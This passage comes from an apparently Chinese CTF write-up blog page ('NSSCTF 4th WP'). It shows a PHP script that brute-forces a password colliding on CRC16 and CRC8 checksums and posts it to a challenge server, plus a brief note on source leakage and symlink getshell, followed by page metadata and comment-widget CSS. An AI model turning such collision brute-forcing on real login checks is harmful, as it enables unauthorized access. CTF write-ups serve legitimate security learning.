class="variable">$SECRET_PASS</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="variable">$char_i</span> = <span class="number">0</span>; <span class="variable">$char_i</span> &lt; <span class="number">256</span>; <span class="variable">$char_i</span>++) &#123;</span><br><span class="line">                <span class="variable">$candidate_i</span> = <span class="title function_ invoke__">substr_replace</span>(<span class="variable">$base</span>, <span class="title function_ invoke__">chr</span>(<span class="variable">$char_i</span>), <span class="variable">$i</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> (<span class="variable">$char_j</span> = <span class="number">0</span>; <span class="variable">$char_j</span> &lt; <span class="number">256</span>; <span class="variable">$char_j</span>++) &#123;</span><br><span class="line">                    <span class="variable">$attempts</span>++;</span><br><span class="line">                    <span class="variable">$candidate</span> = <span class="title function_ invoke__">substr_replace</span>(<span class="variable">$candidate_i</span>, <span class="title function_ invoke__">chr</span>(<span class="variable">$char_j</span>), <span class="variable">$j</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 跳过原始密码</span></span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$candidate</span> === <span class="variable">$SECRET_PASS</span>) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 先检查CRC16</span></span><br><span class="line">                    <span class="variable">$crc16</span> = <span class="title function_ invoke__">compute_crc16</span>(<span class="variable">$candidate</span>);</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$crc16</span> !== <span class="variable">$target_crc16</span>) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 再检查CRC8</span></span><br><span class="line">                    <span class="variable">$crc8</span> = <span class="title function_ invoke__">calculate_crc8</span>(<span class="variable">$candidate</span>);</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$crc8</span> === <span class="variable">$target_crc8</span>) &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;\n发现碰撞密码: &quot;</span> . <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$candidate</span>) . <span class="string">&quot; (原始: <span class="subst">$candidate</span>)\n&quot;</span>;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;经过 <span class="subst">$attempts</span> 次尝试\n&quot;</span>;</span><br><span class="line">                        <span class="variable">$found</span> = <span class="literal">true</span>;</span><br><span class="line">                        <span class="keyword">break</span> <span class="number">4</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 阶段3: 随机搜索 (全面搜索)</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$found</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\n阶段2未找到碰撞，进入阶段3...\n&quot;</span>;</span><br><span class="line">    <span class="variable">$maxAttempts</span> = <span class="number">20000000</span>; <span class="comment">// 2000万次尝试上限</span></span><br><span class="line">    <span class="variable">$startTime</span> = <span class="title function_ invoke__">microtime</span>(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$attempts</span> &lt; <span class="variable">$maxAttempts</span>) &#123;</span><br><span class="line">        <span class="variable">$attempts</span>++;</span><br><span class="line">        <span class="variable">$candidate</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 生成随机密码</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$k</span> = <span class="number">0</span>; <span class="variable">$k</span> &lt; <span class="variable">$passLength</span>; <span class="variable">$k</span>++) &#123;</span><br><span class="line">            <span class="variable">$candidate</span> .= <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="number">255</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 跳过原始密码</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$candidate</span> === <span class="variable">$SECRET_PASS</span>) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 先检查CRC16</span></span><br><span class="line">        <span class="variable">$crc16</span> = <span class="title function_ invoke__">compute_crc16</span>(<span class="variable">$candidate</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$crc16</span> !== <span class="variable">$target_crc16</span>) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 再检查CRC8</span></span><br><span class="line">        <span class="variable">$crc8</span> = <span class="title function_ invoke__">calculate_crc8</span>(<span class="variable">$candidate</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$crc8</span> === <span class="variable">$target_crc8</span>) &#123;</span><br><span class="line">            <span class="variable">$time</span> = <span class="title function_ invoke__">microtime</span>(<span class="literal">true</span>) - <span class="variable">$startTime</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;\n发现碰撞密码: &quot;</span> . <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$candidate</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;经过 <span class="subst">$attempts</span> 次尝试 (&quot;</span> . <span class="title function_ invoke__">round</span>(<span class="variable">$time</span>, <span class="number">2</span>) . <span class="string">&quot;秒)\n&quot;</span>;</span><br><span class="line">            <span class="variable">$found</span> = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 每百万次显示进度</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$attempts</span> % <span class="number">1000000</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="variable">$time</span> = <span class="title function_ invoke__">microtime</span>(<span class="literal">true</span>) - <span class="variable">$startTime</span>;</span><br><span class="line">            <span class="variable">$rate</span> = <span class="variable">$attempts</span> / <span class="variable">$time</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;进度: <span class="subst">$attempts</span>/&quot;</span> . <span class="title function_ invoke__">number_format</span>(<span class="variable">$maxAttempts</span>) . <span class="string">&quot; 次尝试 | &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;速率: &quot;</span> . <span class="title function_ invoke__">number_format</span>(<span class="variable">$rate</span>) . <span class="string">&quot;次/秒\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 结果输出</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$found</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\n✅ 找到有效密码! 使用以下密码提交获取flag:\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;密码: &quot;</span> . <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$candidate</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;原始格式: <span class="subst">$candidate</span>\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\n❌ 未找到碰撞密码，尝试增加搜索上限\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&quot;http://node9.anna.nssctf.cn:24937/&quot;</span>; <span class="comment">// 替换为实际URL</span></span><br><span class="line"><span class="variable">$collision_hex</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$candidate</span>);  <span class="comment">//</span></span><br><span class="line"><span class="variable">$collision_string</span> = <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$collision_hex</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = [<span class="string">&quot;pass&quot;</span> =&gt; <span class="variable">$collision_string</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_POST, <span class="literal">true</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_POSTFIELDS, <span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$response</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$response</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20250824132731057.png"
+                      alt="image-20250824132731057"
+                ></p>
+<h2 id="ez-upload"><a href="#ez-upload" class="headerlink" title="ez_upload"></a>ez_upload</h2><p>主要通过 <code>php -S</code>打源码泄露，具体参考<br><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/PjOmSozGtjq4H_uzSFJWEg" >https://mp.weixin.qq.com/s/PjOmSozGtjq4H_uzSFJWEg <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>拿到源码</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20250824155641475.png"
+                      alt="image-20250824155641475"
+                ></p>
+<p>软连接getshell</p>
+<p>参考<br><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/2301_80793533/article/details/146882981" >https://blog.csdn.net/2301_80793533/article/details/146882981 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20250824155709672.png"
+                      alt="image-20250824155709672"
+                ></p>
+
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> NSSCTF 4th WP</li>
+        <li><strong>Author:</strong> xiaolaisec</li>
+        <li><strong>Created at
+                :</strong> 2025-08-26 22:14:11</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-08-25 13:59:09
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://redefine.ohevan.com/2025/08/26/NSSCTF 4th/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/CTF/">#CTF</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/JAVA/">#JAVA</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/PHP/">#PHP</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/Python/">#Python</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2025/08/19/%E6%96%B0%E7%89%88%E6%9C%ACflask%E4%B8%ADconsole%E7%9A%84pin%E7%A0%81%E8%AE%A1%E7%AE%97/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">新版本flask中console的pin码计算——SekaiCTF2025 MyFlaskApp</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            :root
+    --waline-font-size 1rem
+    --waline-white #fff
+    --waline-light-grey #999
+    --waline-dark-grey #666
+    --waline-theme-color var(--primary-color)
+    --waline-active-color lighten($primary-color, 10%)
+    --waline-color #444
+    --waline-bgcolor #fff
+    --waline-bgcolor-light #f8f8f8
+    --waline-bgcolor-hover #f0f0f0
+    --waline-border-color #ddd
+    --waline-disable-bgcolor #f8f8f8
+    --waline-disable-color #000
+    --waline-code-bgcolor #282c34
+    --waline-bq-color #f0f0f0
+    --waline-avatar-size 3.25rem
+    --waline-m-avatar-size calc((var(--waline-avatar-size) * 9 / 13))
+    --waline-badge-color #3498db
+    --waline-badge-font-size 0.75em
+    --waline-info-bgcolor #f8f8f8
+    --waline-info-color #999
+    --waline-info-font-size 0.625em
+    --waline-border none
+    --waline-avatar-radius 28%
+    // --redefine-box-shadow var(--redefine-box-shadow-flat) !important
+
+[data-waline]
+    font-size var(--waline-font-size)
+    text-align start
+
+[dir=rtl] [data-waline]
+    direction rtl
+
+[data-waline] *
+    box-sizing content-box
+    line-height 1.75
+
+[data-waline] p
+    color var(--waline-color)
+
+[data-waline] a
+    position relative
+    display inline-block
+    color var(--waline-theme-color)
+    text-decoration none
+    word-break break-word
+    cursor pointer
+
+[data-waline] a:hover
+    color var(--waline-active-color)
+
+[data-waline] img
+    max-width 100%
+    max-height 400px
+    border none
+
+[data-waline] hr
+    margin 0.825em 0
+    border-style dashed
+    border-color var(--waline-bgcolor-light)
+
+[data-waline] code, [data-waline] pre
+    margin 0
+    padding 0.2em 0.4em
+    border-radius 3px
+    background var(--waline-bgcolor-light)
+    font-size 85%
+
+[data-waline] pre
+    overflow auto
+    padding 10px
+    line-height 1.45
+
+[data-waline] pre::-webkit-scrollbar
+    width 6px
+    height 6px
+
+[data-waline] pre::-webkit-scrollbar-track-piece:horizontal
+    -webkit-border-radius 6px
+    border-radius 6px
+    background rgba(0, 0, 0, 0.1)
+
+[data-waline] pre::-webkit-scrollbar-thumb:horizontal
+    width 6px
+    -webkit-border-radius 6px
+    border-radius 6px
+    background var(--waline-theme-color)
+
+[data-waline] pre code
+    padding 0
+    background rgba(0, 0, 0, 0)
+    color var(--waline-color)
+    white-space pre-wrap
+    word-break keep-all
+
+[data-waline] blockquote
+    margin 0.5em 0
+    padding 0.5em 0 0.5em 1em
+    border-inline-start 8px solid var(--waline-bq-color)
+    color var(--waline-dark-grey)
+
+[data-waline] blockquote>p
+    margin 0
+
+[data-waline] ol, [data-waline] ul
+    margin-inline-start 1.25em
+    padding 0
+
+[data-waline] input[type=checkbox], [data-waline] input[type=radio]
+    display inline-block
+    vertical-align middle
+    margin-top -2px
+
+.wl-btn
+    display inline-block
+    vertical-align middle
+    min-width 2.5em
+    margin-bottom 0
+    padding 0.5em 1em
+    border 1px solid var(--waline-border-color)
+    border-radius 0.5em
+    background rgba(0, 0, 0, 0)
+    color var(--waline-color)
+    font-weight 400
+    font-size 0.75em
+    line-height 1.5
+    text-align center
+    white-space nowrap
+    cursor pointer
+    user-select none
+    transition-duration 0.4s
+    touch-action manipulation
+
+.wl-btn:hover, .wl-btn:active
+    border-color var(--waline-theme-color)
+    color var(--waline-theme-color)
+
+.wl-btn:disabled
+    border-color var(--waline-border-color)
+    background var(--waline-disable-bgcolor)
+    color var(--waline-disable-color)
+    cursor not-allowed
+
+.wl-btn.primary
+    border-color var(--waline-theme-color)
+    background var(--waline-theme-color)
+    color var(--waline-white)
+
+.wl-btn.primary:hover, .wl-btn.primary:active
+    border-color var(--waline-active-color)
+    background var(--waline-active-color)
+    color var(--waline-white)
+
+.wl-btn.primary:disabled
+    border-color var(--waline-border-color)
+    background var(--waline-disable-bgcolor)
+    color var(--waline-disable-color)
+    cursor not-allowed
+
+.wl-loading
+    text-align center
+
+.wl-loading svg
+    margin 0 auto
+
+.wl-comment
+    position relative
+    display flex
+    margin-bottom 0.75em
+
+.wl-close
+    position absolute
+    top -4px
+    inset-inline-end -4px
+    padding 0
+    border none
+    background rgba(0, 0, 0, 0)
+    line-height 1
+    cursor pointer
+
+.wl-login-info
+    max-width 80px
+    margin-top 0.75em
+    text-align center
+
+.wl-logout-btn
+    position absolute
+    top -10px
+    inset-inline-end -10px
+    padding 3px
+    border none
+    background rgba(0, 0, 0, 0)
+    line-height 0
+    cursor pointer
+
+.wl-avatar
+    position relative
+    width var(--waline-avatar-size)
+    height var(--waline-avatar-size)
+    margin 0 auto
+    border var(--waline-border)
+    border-radius var(--waline-avatar-radius)
+
+@media (max-width 720px)
+    .wl-avatar
+        width var(--waline-m-avatar-size)
+        height var(--waline-m-avatar-size)
+
+.wl-avatar img
+    width 100%
+    height 100%
+    border-radius var(--waline-avatar-radius)
+
+.wl-login-nick
+    display block
+    color var(--waline-theme-color)
+    font-size 0.75em
+    word-break break-all
+
+.wl-panel
+    position relative
+    flex-shrink 1
+    width 100%
+    margin 0.5em
+    border var(--waline-border)
+    border-radius 0.75em
+    background var(--waline-bgcolor)
+    box-shadow var(--redefine-box-shadow-flat)
+
+    &:hover
+        box-shadow var(--redefine-box-shadow-flat-hover)
+
+.wl-header
+    display flex
+    overflow hidden
+    padding 0 4px
+    border-bottom 2px dashed var(--waline-border-color)
+    border-top-left-radius 0.75em
+    border-top-right-radius 0.75em
+
+@media (max-width 580px)
+    .wl-header
+        display block
+
+.wl-header label
+    min-width 40px
+    padding 0.75em 0.5em
+    color var(--waline-color)
+    font-size 0.75em
+    text-align center
+
+.wl-header input
+    flex 1
+    width 0
+    padding 0.5em
+    background rgba(0, 0, 0, 0)
+    font-size 0.625em
+    resize none
+
+.wl-header-item
+    display flex
+    flex 1
+
+@media (max-width 580px)
+    .wl-header-item:not(:last-child)
+        border-bottom 2px dashed var(--waline-border-color)
+
+.wl-header-1 .wl-header-item
+    width 100%
+
+.wl-header-2 .wl-header-item
+    width 50%
+
+@media (max-width 580px)
+    .wl-header-2 .wl-header-item
+        flex 0
+        width 100%
+
+.wl-header-3 .wl-header-item
+    width 33.33%
+
+@media (max-width 580px)
+    .wl-header-3 .wl-header-item
+        width 100%
+
+.wl-editor
+    position relative
+    width calc(100% - 1em)
+    min-height 8.75em
+    margin 0.75em 0.5em
+    border-radius 0.5em
+    background rgba(0, 0, 0, 0)
+    font-size 0.875em
+    resize vertical
+
+.wl-editor, .wl-input
+    max-width 100%
+    border none
+    color var(--waline-color)
+    outline none
+    transition all 0.25s ease
+
+.wl-editor:focus, .wl-input:focus
+    background var(--waline-bgcolor-light)
+
+.wl-preview
+    padding 0 0.5em 0.5em
+
+.wl-preview h4
+    margin 0.25em
+    font-weight bold
+    font-size 0.9375em
+
+.wl-preview .wl-content
+    min-height 1.25em
+    padding 0.25em
+    word-break break-word
+    hyphens auto
+
+.wl-preview .wl-content>*:first-child
+    margin-top 0
+
+.wl-preview .wl-content>*:last-child
+    margin-bottom 0
+
+.wl-footer
+    position relative
+    display flex
+    flex-wrap wrap
+    margin 0.5em 0.75em
+
+.wl-actions
+    display flex
+    flex 2
+    align-items center
+
+.wl-action
+    display inline-flex
+    align-items center
+    justify-content center
+    width 1.5em
+    height 1.5em
+    margin 2px
+    padding 0
+    border none
+    background rgba(0, 0, 0, 0)
+    color var(--waline-color)
+    font-size 16px
+    cursor pointer
+
+.wl-action:hover
+    color var(--waline-theme-color)
+
+.wl-action.active
+    color var(--waline-active-color)
+
+#wl-image-upload
+    display none
+
+#wl-image-upload:focus+label
+    color var(--waline-color)
+
+#wl-image-upload:focus-visible+label
+    outline -webkit-focus-ring-color auto 1px
+
+.wl-info
+    display flex
+    flex 3
+    align-items center
+    justify-content flex-end
+
+.wl-info .wl-text-number
+    color var(--waline-info-color)
+    font-size 0.75em
+
+.wl-info .wl-text-number .illegal
+    color red
+
+.wl-info button
+    margin-inline-start 0.75em
+
+.wl-info button svg
+    display block
+    margin 0 auto
+    line-height 18px
+
+.wl-emoji-popup
+    position absolute
+    top 100%
+    inset-inline-start 1.25em
+    z-index 10
+    max-width 526px
+    border var(--waline-border)
+    border-radius 6px
+    background var(--waline-bgcolor)
+    box-shadow var(--redefine-box-shadow-flat)
+    opacity 0
+    visibility hidden
+    transition transform 0.2s ease-out, opacity 0.2s ease-out
+    transform scale(0.9, 0.9)
+    transform-origin 0 0
+
+.wl-emoji-popup.display
+    opacity 1
+    visibility visible
+    transform none
+
+.wl-emoji-popup button
+    display inline-block
+    vertical-align middle
+    width 2em
+    margin 0.125em
+    padding 0
+    border-width 0
+    background rgba(0, 0, 0, 0)
+    font-size inherit
+    line-height 2
+    text-align center
+    cursor pointer
+
+.wl-emoji-popup button:hover
+    background var(--waline-bgcolor-hover)
+
+.wl-emoji-popup .wl-emoji
+    display inline-block
+    vertical-align middle
+    max-width 1.5em
+    max-height 1.5em
+
+.wl-emoji-popup .wl-tab-wrapper
+    overflow-y auto
+    max-height 145px
+    padding 0.5em
+
+.wl-emoji-popup .wl-tab-wrapper::-webkit-scrollbar
+    width 6px
+    height 6px
+
+.wl-emoji-popup .wl-tab-wrapper::-webkit-scrollbar-track-piece:vertical
+    -webkit-border-radius 6px
+    border-radius 6px
+    background rgba(0, 0, 0, 0.1)
+
+.wl-emoji-popup .wl-tab-wrapper::-webkit-scrollbar-thumb:vertical
+    width 6px
+    -webkit-border-radius 6px
+    border-radius 6px
+    background var(--waline-theme-color)
+
+.wl-emoji-popup .wl-tabs
+    position relative
+    overflow-x auto
+    padding 0 6px
+    white-space nowrap
+
+.wl-emoji-popup .wl-tabs::before
+    content ' '
+    position absolute
+    top 0
+    right 0
+    left 0
+    z-index 2
+    height 1px
+    background var(--waline-border-color)
+
+.wl-emoji-popup .wl-tabs::-webkit-scrollbar
+    width 6px
+    height 6px
+
+.wl-emoji-popup .wl-tabs::-webkit-scrollbar-track-piece:horizontal
+    -webkit-border-radius 6px
+    border-radius 6px
+    background rgba(0, 0, 0, 0.1)
+
+.wl-emoji-popup .wl-tabs::-webkit-scrollbar-thumb:horizontal
+    height 6px
+    -webkit-border-radius 6px
+    border-radius 6px
+    background var(--waline-theme-color)
+
+.wl-emoji-popup .wl-tab
+    position relative
+    margin 0
+    padding 0 0.5em
+
+.wl-emoji-popup .wl-tab.active
+    z-index 3
+    border 1px solid var(--waline-border-color)
+    border-top-width 0
+    border-bottom-right-radius 6px
+    border-bottom-left-radius 6px
+    background var(--waline-bgcolor)
+
+.wl-gif-popup
+    position absolute
+    top 100%
+    inset-inline-start 1.25em
+    z-index 10
+    width calc(100% - 3em)
+    padding 0.75em 0.75em 0.25em
+    border var(--waline-border)
+    border-radius 6px
+    background var(--waline-bgcolor)
+    box-shadow var(--redefine-box-shadow-flat)
+    opacity 0
+    visibility hidden
+    transition transform 0.2s ease-out, opacity 0.2s ease-out
+    transform scale(0.9, 0.9)
+    transform-origin 0 0
+
+.wl-gif-popup.display
+    opacity 1
+    visibility visible
+    transform none
+
+.wl-gif-popup input
+    box-sizing border-box
+    width 100%
+    margin-bottom 10px
+    padding 3px 5px
+    border var(--waline-border)
+
+.wl-gif-popup img
+    display block
+    box-sizing border-box
+    width 100%
+    border-width 2px
+    border-style solid
+    border-color #fff
+    cursor pointer
+
+.wl-gif-popup img:hover
+    border-color var(--waline-theme-color)
+    border-radius 2px
+
+.wl-gallery
+    display flex
+    overflow-y auto
+    max-height 80vh
+
+.wl-gallery-column
+    display flex
+    flex 1
+    flex-direction column
+    height -webkit-max-content
+    height -moz-max-content
+    height max-content
+
+.wl-cards .wl-user
+    --avatar-size var(--waline-avatar-size)
+    position relative
+    margin-inline-end 0.75em
+
+@media (max-width 720px)
+    .wl-cards .wl-user
+        --avatar-size var(--waline-m-avatar-size)
+
+.wl-cards .wl-user img
+    width var(--avatar-size)
+    height var(--avatar-size)
+    border-radius var(--waline-avatar-radius)
+    box-shadow var(--redefine-box-shadow-flat)
+
+.wl-cards .wl-user .verified-icon
+    position absolute
+    top calc((var(--avatar-size) * 3 / 4))
+    inset-inline-start calc((var(--avatar-size) * 3 / 4))
+    border-radius 50%
+    background var(--waline-bgcolor)
+    box-shadow var(--redefine-box-shadow-flat)
+
+.wl-card-item
+    position relative
+    display flex
+    padding 0.5em
+
+.wl-card-item .wl-card-item
+    padding-inline-end 0
+
+.wl-card
+    flex 1
+    width 0
+    padding-bottom 0.5em
+    border-bottom 1px dashed var(--waline-border-color)
+
+.wl-card:first-child
+    margin-inline-start 1em
+
+.wl-card-item:last-child .wl-card
+    border-bottom none
+
+.wl-card .wl-head
+    overflow hidden
+    line-height 1.5
+
+.wl-card .wl-nick
+    position relative
+    display inline-block
+    margin-inline-end 0.5em
+    font-weight bold
+    font-size 0.875em
+    line-height 1
+    text-decoration none
+
+.wl-card .wl-nick svg
+    position relative
+    bottom -0.125em
+    line-height 1
+
+.wl-card span.wl-nick
+    color var(--waline-dark-grey)
+
+.wl-card .wl-badge
+    display inline-block
+    margin-inline-end 1em
+    padding 0 0.3em
+    border 1px solid var(--waline-badge-color)
+    border-radius 4px
+    color var(--waline-badge-color)
+    font-size var(--waline-badge-font-size)
+
+.wl-card .wl-time
+    margin-inline-end 0.875em
+    color var(--waline-info-color)
+    font-size 0.75em
+
+.wl-card .wl-meta
+    position relative
+    line-height 1
+
+.wl-card .wl-meta>span
+    display inline-block
+    margin-inline-end 0.25em
+    padding 2px 4px
+    border-radius 0.2em
+    background var(--waline-info-bgcolor)
+    color var(--waline-info-color)
+    font-size var(--waline-info-font-size)
+    line-height 1.5
+
+.wl-card .wl-meta>span:empty
+    display none
+
+.wl-card .wl-comment-actions
+    float right
+    line-height 1
+
+[dir=rtl] .wl-card .wl-comment-actions
+    float left
+
+.wl-card .wl-delete, .wl-card .wl-like, .wl-card .wl-reply, .wl-card .wl-edit
+    display inline-flex
+    align-items center
+    border none
+    background rgba(0, 0, 0, 0)
+    color var(--waline-color)
+    line-height 1
+    cursor pointer
+    transition color 0.2s ease
+
+.wl-card .wl-delete:hover, .wl-card .wl-like:hover, .wl-card .wl-reply:hover, .wl-card .wl-edit:hover
+    color var(--waline-theme-color)
+
+.wl-card .wl-delete.active, .wl-card .wl-like.active, .wl-card .wl-reply.active, .wl-card .wl-edit.active
+    color var(--waline-active-color)
+
+.wl-card .wl-content
+    position relative
+    margin-bottom 0.75em
+    padding-top 0.625em
+    font-size 0.875em
+    line-height 2
+    word-wrap break-word
+
+.wl-card .wl-content.expand
+    overflow hidden
+    max-height 8em
+    cursor pointer
+
+.wl-card .wl-content.expand::before
+    content ''
+    position absolute
+    top 0
+    bottom 3.15em
+    inset-inline-start 0
+    z-index 999
+    display block
+    width 100%
+    background linear-gradient(180deg, #000, rgba(255, 255, 255, 0.9))
+
+.wl-card .wl-content.expand::after
+    content attr(data-expand)
+    position absolute
+    bottom 0
+    inset-inline-start 0
+    z-index 999
+    display block
+    width 100%
+    height 3.15em
+    background rgba(255, 255, 255, 0.9)
+    color #828586
+    line-height 3.15em
+    text-align center
+
+.wl-card .wl-content>*:first-child
+    margin-top 0
+
+.wl-card .wl-content>*:last-child
+    margin-bottom 0
+
+.wl-card .wl-admin-actions
+    margin 8px 0
+    font-size 12px
+    text-align right
+
+.wl-card .wl-comment-status
+    margin 0 8px
+
+.wl-card .wl-comment-status .wl-btn
+    border-radius 0
+
+.wl-card .wl-comment-status .wl-btn:first-child
+    border-inline-end 0
+    border-radius 0.5em 0 0 0.5em
+
+.wl-card .wl-comment-status .wl-btn:last-child
+    border-inline-start 0
+    border-radius 0 0.5em 0.5em 0
+
+.wl-card .wl-quote
+    border-inline-start 1px dashed rgba(237, 237, 237, 0.5)
+
+.wl-card .wl-quote .wl-user
+    --avatar-size var(--waline-m-avatar-size)
+
+.wl-close-icon
+    color var(--waline-border-color)
+
+.wl-content .vemoji, .wl-content .wl-emoji
+    display inline-block
+    vertical-align baseline
+    height 1.25em
+    margin -0.125em 0.25em
+
+.wl-content .wl-tex
+    background var(--waline-info-bgcolor)
+    color var(--waline-info-color)
+
+.wl-content span.wl-tex
+    display inline-block
+    margin-inline-end 0.25em
+    padding 2px 4px
+    border-radius 0.2em
+    font-size var(--waline-info-font-size)
+    line-height 1.5
+
+.wl-content p.wl-tex
+    text-align center
+
+.wl-content .katex-display
+    overflow auto hidden
+    -webkit-overflow-scrolling touch
+    padding-top 0.2em
+    padding-bottom 0.2em
+
+.wl-content .katex-display::-webkit-scrollbar
+    height 3px
+
+.wl-content .katex-error
+    color red
+
+.wl-count
+    flex 1
+    font-weight bold
+    font-size 1.25em
+
+.wl-empty
+    overflow auto
+    padding 1.25em
+    color var(--waline-color)
+    text-align center
+
+.wl-operation
+    text-align center
+
+.wl-operation button
+    margin 1em 0
+
+.wl-power
+    padding 0.5em 0
+    color var(--waline-light-grey)
+    font-size var(--waline-info-font-size)
+    text-align end
+
+.wl-meta-head
+    display flex
+    flex-direction row
+    align-items center
+    padding 0.375em
+
